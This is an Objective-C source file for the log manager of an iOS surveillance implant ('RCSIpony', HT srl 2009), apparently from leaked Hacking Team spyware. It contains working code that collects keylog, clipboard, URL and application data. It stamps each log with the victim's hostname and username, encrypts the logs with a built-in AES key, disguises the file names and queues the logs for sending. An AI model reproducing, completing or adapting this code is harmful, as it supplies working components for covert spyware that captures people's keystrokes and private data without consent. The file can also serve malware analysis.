/*
 * RCSIpony - Log Manager
 *  Logging facilities, this class is a singleton which will be referenced
 *  by RCSMCommunicationManager and all the single agents providing ways for
 *  writing log data per agentID or agentLogFileHandle.
 *
 *
 *  - Provide all the instance methods in order to access and remove items from
 *    the queues without the needs for external objects to access the queue
 *    directly, aka Keep It Pr1v4t3!
 *
 * Created by Alfredo 'revenge' Pesoli on 16/06/2009
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */

#import "RCSILogManager.h"
#import "RCSIEncryption.h"

#import <CommonCrypto/CommonDigest.h>

//#define DEBUG

static RCSILogManager *sharedLogManager = nil;

#pragma mark -
#pragma mark Log File Header Struct Definition
#pragma mark -

//
// First DWORD is not encrypted and specifies: sizeof(logStruct) + deviceIdLen + 
// userIdLen + sourceIdLen + uAdditionalData
//
typedef struct _log {
  u_int version;
#define LOG_VERSION   2008121901
  u_int type;
  u_int hiTimestamp;
  u_int loTimestamp;
  u_int deviceIdLength;       // IMEI/Hostname len
  u_int userIdLength;         // IMSI/Username len
  u_int sourceIdLength;       // Caller Number / IP length
  u_int additionalDataLength; // Size of additional data if present
} logStruct;

@implementation RCSILogManager

#pragma mark -
#pragma mark Class and init methods
#pragma mark -

+ (RCSILogManager *)sharedInstance
{
  @synchronized(self)
  {
    if (sharedLogManager == nil)
      {
        //
        // Assignment is not done here
        //
        [[self alloc] init];
      }
  }
  
  return sharedLogManager;
}

+ (id)allocWithZone: (NSZone *)aZone
{
  @synchronized(self)
  {
    if (sharedLogManager == nil)
      {
        sharedLogManager = [super allocWithZone: aZone];
        
        //
        // Assignment and return on first allocation
        //
        return sharedLogManager;
      }
  }
  
  // On subsequent allocation attemps return nil
  return nil;
}

- (id)copyWithZone: (NSZone *)aZone
{
  return self;
}

- (id)init
{
  Class myClass = [self class];
  
  @synchronized(myClass)
    {
      if (sharedLogManager != nil)
        {
          self = [super init];
          
          if (self != nil)
            {
              mNoAutoQueuedLogs = [[NSMutableArray alloc] init];
              mAutoQueuedLogs   = [[NSMutableArray alloc] init];              
              mSendQueue = [[NSMutableArray alloc] init];

#ifdef DEV_MODE
              unsigned char result[CC_MD5_DIGEST_LENGTH];
              CC_MD5(gLogAesKey, strlen(gLogAesKey), result);
              
              NSData *temp = [NSData dataWithBytes: result
                                            length: CC_MD5_DIGEST_LENGTH];
#else
              NSData *temp = [NSData dataWithBytes: gLogAesKey
                                            length: CC_MD5_DIGEST_LENGTH];
#endif
              
              mEncryption = [[RCSIEncryption alloc] initWithKey: temp];
            }
          
          sharedLogManager = self;
        }
    }
  
  return sharedLogManager;
}

- (id)retain
{
  return self;
}

- (unsigned)retainCount
{
  // Denotes an object that cannot be released
  return UINT_MAX;
}

- (void)release
{
  // Do nothing
}

- (id)autorelease
{
  return self;
}

#pragma mark -
#pragma mark Logging facilities
#pragma mark -

- (NSMutableArray*)getLogQueue: (u_int)agentID
{
  NSMutableArray *aQueue = mAutoQueuedLogs;
 
  switch (agentID) 
  {
    case LOG_URL:
      aQueue = mNoAutoQueuedLogs;
      break;
    case LOG_APPLICATION:
      aQueue = mNoAutoQueuedLogs;
      break;
    case LOG_KEYLOG:
      aQueue = mNoAutoQueuedLogs;
      break;
    case LOG_CLIPBOARD:
      aQueue = mNoAutoQueuedLogs;
      break;
  }

  return aQueue;
}

- (NSData *)createLogHeader: (u_int)agentID
                   timestamp: (int64_t)fileTime
                 agentHeader: (NSData *)anAgentHeader
{
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];

  char tempHost[100];
  NSString *hostName;
  
  if (gethostname(tempHost, 100) == 0)
    hostName = [NSString stringWithCString: tempHost
                                  encoding: NSUTF8StringEncoding];
  else
    hostName = @"EMPTY";
  
  NSString *userName = NSUserName();
  
  logStruct *logRawHeader;
  NSMutableData *logHeader = [[NSMutableData dataWithLength: sizeof(logStruct)] retain];
  
#ifdef DEBUG
  NSLog(@"logStruct: %d", sizeof(logStruct));
#endif
  logRawHeader = (logStruct *)[logHeader bytes];
  
  logRawHeader->version = LOG_VERSION;
  logRawHeader->type = agentID;
  logRawHeader->hiTimestamp = (int64_t)fileTime >> 32;
  logRawHeader->loTimestamp = (int64_t)fileTime & 0xFFFFFFFF;
  logRawHeader->deviceIdLength = [hostName lengthOfBytesUsingEncoding: NSUTF16LittleEndianStringEncoding];
  logRawHeader->userIdLength = [userName lengthOfBytesUsingEncoding: NSUTF16LittleEndianStringEncoding];
  logRawHeader->sourceIdLength = 0;
  
  if (anAgentHeader != nil && anAgentHeader != 0)
    logRawHeader->additionalDataLength = [anAgentHeader length];
  else
    logRawHeader->additionalDataLength = 0;
  
#ifdef DEBUG
  NSLog(@"hiTimestamp: %x", logRawHeader->hiTimestamp);
  NSLog(@"loTimestamp: %x", logRawHeader->loTimestamp);
  NSLog(@"logHeader: %@", logHeader);
#endif
  
  int headerLength = sizeof(logStruct) + 
  logRawHeader->deviceIdLength +
  logRawHeader->userIdLength +
  logRawHeader->sourceIdLength +
  logRawHeader->additionalDataLength;
  
  int paddedLength = headerLength;
  
#ifdef DEBUG
  NSLog(@"unpaddedLength: %d", paddedLength);
#endif

  if (paddedLength % kCCBlockSizeAES128)
    {
      int pad = (paddedLength + kCCBlockSizeAES128 & ~(kCCBlockSizeAES128 - 1)) - paddedLength;
      paddedLength += pad;
    }
    
#ifdef DEBUG
  NSLog(@"paddedLength: %d", paddedLength);
#endif

  paddedLength += sizeof(int);
  
  if (paddedLength < headerLength)
    {
      [logHeader release];
      [outerPool release];
      return nil;
    }
  
  NSMutableData *rawHeader = [NSMutableData dataWithCapacity: [logHeader length]
                              + [hostName lengthOfBytesUsingEncoding: NSUTF16LittleEndianStringEncoding]
                              + [userName lengthOfBytesUsingEncoding: NSUTF16LittleEndianStringEncoding]
                              + [anAgentHeader length]];
  
  //
  // Clear dword at the start of the file which specifies the size of the
  // unencrypted data
  //
  headerLength = paddedLength - sizeof(int);
  
#ifdef DEBUG
  NSLog(@"headerLength: %d", headerLength);
#endif
  
  [rawHeader appendData: logHeader];
  [rawHeader appendData: [hostName dataUsingEncoding: NSUTF16LittleEndianStringEncoding]];
  [rawHeader appendData: [userName dataUsingEncoding: NSUTF16LittleEndianStringEncoding]];
  
#ifdef DEBUG
  NSLog(@"logHeader: %@", logHeader);
  NSLog(@"hostName: %@", hostName);
  NSLog(@"userName: %@", userName);
  NSLog(@"rawHeader: %@", rawHeader);
  NSLog(@"anAgentHeader: %@", anAgentHeader);
#endif
  
  if (anAgentHeader != nil)
    [rawHeader appendData: anAgentHeader];
  
#ifdef DEV_MODE
  unsigned char tmp[CC_MD5_DIGEST_LENGTH];
  CC_MD5(gLogAesKey, strlen(gLogAesKey), tmp);
  
  NSData *temp = [NSData dataWithBytes: tmp
                                length: CC_MD5_DIGEST_LENGTH];
#else
  NSData *temp = [NSData dataWithBytes: gLogAesKey
                                length: CC_MD5_DIGEST_LENGTH];
#endif
  
#ifdef DEBUG  
  NSLog(@"rawHeader Size before Encryption: %d", [rawHeader length]);
#endif
  CCCryptorStatus result = 0;
  
  result = [rawHeader encryptWithKey: temp];
  
  [logHeader release];
  
  if (result == kCCSuccess)
    {
      NSMutableData *header = [NSMutableData dataWithCapacity: headerLength + sizeof(int)];
      [header appendBytes: &headerLength length: sizeof(headerLength)];
      [header appendData: rawHeader];
      
#ifdef DEBUG      
      NSLog(@"rawHeader Size after Encryption: %d", [rawHeader length]);
      NSLog(@"headerLength: %x", headerLength);
#endif
    
      [header retain];
      [outerPool release];
      
      return header;
    }
  else
    {
#ifdef DEBUG
      NSLog(@"error on encryption: %d", result);
#endif
    }
  
  [outerPool release];
  
  return nil;
}

- (BOOL)createLog: (u_int)agentID
      agentHeader: (NSData *)anAgentHeader
        withLogID: (u_int)logID
{
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
  
  BOOL success;
  NSError *error;
  
  int64_t filetime;
  NSString *encryptedLogName;
  usleep(50000);
  
  do
    {
      time_t unixTime;
      time(&unixTime);
      filetime = ((int64_t)unixTime * (int64_t)RATE_DIFF) + (int64_t)EPOCH_DIFF;
      int32_t hiPart = (int64_t)filetime >> 32;
      int32_t loPart = (int64_t)filetime & 0xFFFFFFFF;
      
      NSString *logName = [[NSString alloc] initWithFormat: @"LOGF_%.4X_%.8X%.8X.log",
                                                            agentID,
                                                            hiPart,
                                                            loPart];
#ifdef DEBUG
      NSLog(@"LogName: %@", logName);
#endif
      
      encryptedLogName = [NSString stringWithFormat: @"%@/%@",
                          [[NSBundle mainBundle] bundlePath],
                          [mEncryption scrambleForward: logName
                                                  seed: gLogAesKey[0]]];
                        
      [logName release];
    }
  while ([[NSFileManager defaultManager] fileExistsAtPath: encryptedLogName] == TRUE);
  
  success = [@"" writeToFile: encryptedLogName
                  atomically: NO
                    encoding: NSUnicodeStringEncoding
                       error: &error];
  
  if (success == YES)
    {
      NSFileHandle *logFileHandle = [NSFileHandle fileHandleForUpdatingAtPath:
                                     encryptedLogName];
      if (logFileHandle) 
        {
#ifdef DEBUG
          NSLog(@"LogHandle acquired");
#endif

          NSNumber *agent   = [[NSNumber alloc] initWithUnsignedInt: agentID];
          NSNumber *_logID  = [[NSNumber alloc] initWithUnsignedInt: logID];
          
          NSArray *keys     = [NSArray arrayWithObjects: @"agentID",
                                                         @"logID",
                                                         @"logName",
                                                         @"handle",
                                                         @"header",
                                                         nil];
          NSArray *objects;
          
          if (anAgentHeader == nil)
            {
              objects  = [NSArray arrayWithObjects: agent,
                                                    _logID,
                                                    encryptedLogName,
                                                    logFileHandle,
                                                    @"NO",
                                                    nil];
            }
          else
            {
              objects  = [NSArray arrayWithObjects: agent,
                                                    _logID,
                                                    encryptedLogName,
                                                    logFileHandle,
                                                    anAgentHeader,
                                                    nil];
            }
          
          NSMutableDictionary *agentLog = [[NSMutableDictionary alloc] init];
          NSDictionary *dictionary = [NSDictionary dictionaryWithObjects: objects
                                                                 forKeys: keys];
          [agentLog addEntriesFromDictionary: dictionary];
        
          [agent release];
          [_logID release];
          
#ifdef DEBUG
          NSLog(@"activeQueue from Create: %@", mActiveQueue);
#endif
          
          //
          // logHeader contains the whole encrypted header
          // first dword is in clear text (padded size)
          //
          NSData *logHeader = [self createLogHeader: agentID
                                          timestamp: filetime
                                        agentHeader: anAgentHeader];
          
          if (logHeader == nil)
            {
#ifdef DEBUG
              NSLog(@"An error occurred while creating log Header");
#endif   
              [agentLog release];
              [outerPool release];
              
              return FALSE;
            }
            
#ifdef DEBUG
          NSLog(@"encrypted Header: %@", logHeader);
#endif

          if ([self writeDataToLog: logHeader
                         forHandle: logFileHandle] == FALSE)
            {
              [agentLog release];
              [outerPool release];
              return FALSE;
            }
            
          NSMutableArray *theQueue = [self getLogQueue:agentID];
          
          @synchronized(theQueue) 
          {
            [theQueue addObject: agentLog];
          }
          
          [agentLog release];
          [outerPool release];
          
          return TRUE;
        }
    }

#ifdef DEBUG
  NSLog(@"An error occurred while creating the log file");
#endif
  
  [outerPool release];
  
  return FALSE;
}

- (BOOL)writeDataToLog: (NSData *)aData forHandle: (NSFileHandle *)anHandle
{
  @try
    {
      [anHandle writeData: aData];
    }
  @catch (NSException *e)
    {
#ifdef DEBUG
      NSLog(@"%s exception", __FUNCTION__);
#endif
      
      return FALSE;
    }
    
  return TRUE;
}

- (BOOL)writeDataToLog: (NSMutableData *)aData 
              forAgent: (u_int)agentID
             withLogID: (u_int)logID
{
  BOOL dataWrited = FALSE;
  id anObject     = nil;
  id logObject    = nil;
  NSMutableData *encData = nil;
  
  CCCryptorStatus result  = 0;
  NSFileHandle *logHandle = nil;
  
  if (aData == nil)
    return dataWrited;
    
  encData = [[NSMutableData alloc] initWithData: aData];
    
  int _blockSize = [encData length];
  
  NSData *blockSize = [NSData dataWithBytes: (void *)&_blockSize
                                     length: sizeof(int)];
                                     
  NSData *temp = [NSData dataWithBytes: gLogAesKey
                                length: CC_MD5_DIGEST_LENGTH];
  
  result = [encData encryptWithKey: temp];
  
  if (result != kCCSuccess)
    {
      [encData release];
      return dataWrited;
    }    
              
  NSMutableArray *theQueue = [self getLogQueue:agentID];
                                                                                                                
  @synchronized(theQueue)
  {
    NSEnumerator *enumerator = [theQueue objectEnumerator];
    
    while (anObject = [enumerator nextObject])
      {
        if ([[anObject objectForKey: @"agentID"] unsignedIntValue] == agentID &&
           ([[anObject objectForKey:@"logID"] unsignedIntValue] == logID || logID == 0))
          {    
            logObject = anObject;
            break;
          }    
      }
      
      // found!!
      if (logObject != nil)
        {
          logHandle = [logObject objectForKey: @"handle"];
      
          if (logHandle != nil)
            {
              [logHandle writeData: blockSize];
              [logHandle writeData: encData];
              dataWrited = TRUE;
            }
        }
  }
  
  [encData release];
    
  return dataWrited;
}

- (BOOL)closeActiveLog: (u_int)agentID
             withLogID: (u_int)logID
{
  BOOL logClosed = FALSE;
  
  id anObject  = nil;
  id logObject = nil;
  
  NSMutableArray *theQueue = [self getLogQueue:agentID];

  @synchronized(theQueue)
  {
    NSEnumerator *enumerator = [theQueue objectEnumerator];
    
    while (anObject = [enumerator nextObject])
      {
        if ([[anObject objectForKey: @"agentID"] unsignedIntValue] == agentID &&
            ([[anObject objectForKey: @"logID"] unsignedIntValue] == logID || logID == 0))
          {
            logObject = anObject;
            break;
          }
      }
      
    // found the log: no synch yet
    if (logObject != nil)
      {
        NSFileHandle *handle = [logObject objectForKey: @"handle"];
        if (handle != nil)
          {
            [handle closeFile];
            [logObject removeObjectForKey: @"handle"];
          }
        
        // ok it's ready for sending
        @synchronized(mSendQueue)
        {
          [mSendQueue addObject: logObject];
        }
        
        // delete from log queued
        [theQueue removeObject: logObject];
        
        logClosed = TRUE;
      }
  }
  
  usleep(10000);
  
  return logClosed;
}

- (BOOL)closeActiveLogsAndContinueLogging: (BOOL)continueLogging
{
  NSMutableIndexSet *discardedItem  = [NSMutableIndexSet indexSet];
  NSMutableArray *newItems          = [[NSMutableArray alloc] init];
  NSUInteger index                  = 0;
  NSFileHandle *handle = nil;
  
  id item;
  
  @synchronized(mNoAutoQueuedLogs)
  {
    int count = [mNoAutoQueuedLogs count];
    
    for (index = 0; index < count; index++)
      {      
        item = [mNoAutoQueuedLogs objectAtIndex:index];
#ifdef DEBUG
        u_int agentID = [[item objectForKey: @"agentID"] intValue];
        NSLog(@"%s: remove log from queue %#x for agent %#x", __FUNCTION__, mNoAutoQueuedLogs, agentID);
#endif
        handle = [item objectForKey: @"handle"];
        if (handle != nil) 
          [handle closeFile];
        
        [newItems addObject: item];
        [discardedItem addIndex: index];
      }
  
    [mNoAutoQueuedLogs removeObjectsAtIndexes: discardedItem];
  }
  
  @synchronized(mSendQueue)
  {
    [mSendQueue addObjectsFromArray: newItems];
  }
  
  [newItems release];
  
  return TRUE;
}

- (int)getSendLogItemCount
{
  int count;
  
  @synchronized(mSendQueue)
  {
    count = [mSendQueue count];
  }
  
  return count;
}

- (id)getSendLogItemAtIndex:(int)theIndex
{
  id theItem;
  
  theItem = [mSendQueue objectAtIndex:theIndex];
  
  return theItem;
}

- (BOOL)clearSendLogQueue:(NSMutableIndexSet *)theSet
{
  if (theSet == nil)
    return  FALSE;
   
  @synchronized(mSendQueue)
  {
    [mSendQueue removeObjectsAtIndexes: theSet];
  }
  
  return TRUE;
}


#pragma mark -
#pragma mark Accessors
#pragma mark -

- (NSMutableArray *)mActiveQueue
{
  return mActiveQueue;
}

@end
